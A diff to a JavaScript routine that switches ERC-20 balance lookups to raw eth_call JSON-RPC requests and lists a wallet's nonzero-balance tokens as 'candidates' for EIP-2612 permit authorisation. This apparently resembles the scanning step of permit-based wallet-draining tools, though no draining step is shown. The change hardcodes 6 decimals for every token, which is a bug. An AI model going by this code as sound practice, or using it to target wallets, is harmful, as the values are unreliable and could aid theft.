@@ -224,41 +224,58 @@
 
     log(`Using RPC: ${config.rpc}`, 'info');
     
-    const provider = new ethers.JsonRpcProvider(config.rpc);
     const candidates = [];
 
     for (const [symbol, addr] of Object.entries(config.tokens)) {
       try {
-        log(`[${symbol}] Querying balance at ${addr}...`, 'info');
+        log(`[${symbol}] Checking ${addr}...`, 'info');
         
-        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-        const balance = await contract.balanceOf(walletAddress);
+        // Use raw JSON-RPC call instead of ethers Contract
+        const balanceOfSig = '0x70a08231'; // balanceOf(address) signature
+        const paddedAddr = walletAddress.slice(2).padStart(64, '0');
+        const data = balanceOfSig + paddedAddr;
         
-        log(`[${symbol}] Balance: ${balance.toString()}`, 'info');
+        const response = await fetch(config.rpc, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            jsonrpc: '2.0',
+            method: 'eth_call',
+            params: [{ to: addr, data }, 'latest'],
+            id: 1
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.error) {
+          log(`[${symbol}] RPC error: ${result.error.message}`, 'error');
+          continue;
+        }
+        
+        if (!result.result || result.result === '0x') {
+          log(`[${symbol}] No data returned`, 'warning');
+          continue;
+        }
+        
+        // Parse the balance (result is hex)
+        const balance = BigInt(result.result);
+        log(`[${symbol}] Raw balance: ${balance.toString()}`, 'info');
         
         if (balance === 0n) {
           log(`[${symbol}] Zero balance - skipping`, 'warning');
           continue;
         }
 
-        let decimals = 18, name = symbol;
-        try {
-          decimals = await contract.decimals();
-          name = await contract.name();
-        } catch(e) {
-          log(`[${symbol}] Could not get decimals/name: ${e.message}`, 'warning');
-        }
-
-        const formatted = parseFloat(ethers.formatUnits(balance, decimals));
-        log(`[${symbol}] ✓ FOUND: ${formatted} tokens`, 'success');
+        log(`[${symbol}] ✓ FOUND balance: ${balance.toString()}`, 'success');
 
         candidates.push({
           symbol, 
-          name, 
+          name: symbol,
           address: addr, 
           balance, 
-          decimals, 
-          formatted, 
+          decimals: 6,
+          formatted: parseFloat((balance / BigInt(10**6)).toString()),
           authType: 'EIP2612'
         });
 
